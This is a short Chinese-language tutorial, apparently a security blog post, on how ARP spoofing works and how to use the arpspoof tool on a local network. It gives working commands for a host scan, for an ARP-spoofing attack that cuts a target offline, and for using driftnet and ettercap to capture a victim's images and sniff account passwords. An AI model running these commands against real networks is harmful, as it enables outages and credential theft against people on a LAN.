今天我们来谈谈ARP欺骗的原理以及ARP工具——arpspoof的使用

一：原理分解

![1661180290_63039982172159c1aafd7.png!small](https://image.3001.net/images/20220822/1661180290_63039982172159c1aafd7.png!small)

1、每台装有tcp/ip协议的电脑里都有一个ARP缓存表，表里的ip地址与mac地址是一一对应的。  
2、ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗。  
3、ARP攻击仅能在局域网进行，无法对外网进行攻击。

二：ARPspoof

首先是他的安装，kali是自带的，但是unbuntu中不带，指令是sudo apt-get install dsniff

(1)断网攻击

我们先用nmap扫存活机，指令如下nmap -sP 192.168.1.1/24

我的内网IP是192.168.1.164，网关是192.168.1.1，我们对自己发动断网攻击

![1661180811_63039b8b56ed84824a0eb.png!small](https://image.3001.net/images/20220822/1661180811_63039b8b56ed84824a0eb.png!small)

现在 我ping了下百度，可以看到是有网络连接的

用法 指令：

arpspoof -i 网卡 -t 目标IP 网关  
也可以使用反向欺骗：  
arpspoof -i 网卡 -t 网关 目标IP

比如

arpspoof -i eth0 -t 192.168.1.164 192.168.1.1

![1661311119_6305988f4bc4571f3ecf6.png!small](https://image.3001.net/images/20220824/1661311119_6305988f4bc4571f3ecf6.png!small)![1661311119_6305988f16303a64c0f96.png!small](https://image.3001.net/images/20220824/1661311119_6305988f16303a64c0f96.png!small)

因为我们欺骗目标机，使目标机的流量经过自己的网卡，所以这里我们嗅探自己的网卡，可以使用 driftnet -i eth0 来窃取受害者网络中传输的图片

也可以使用ettercap -Tq -i eth0 进行账号密码嗅探 **，** 具体我不演示了，自己研究

 **piss:谢谢观看**

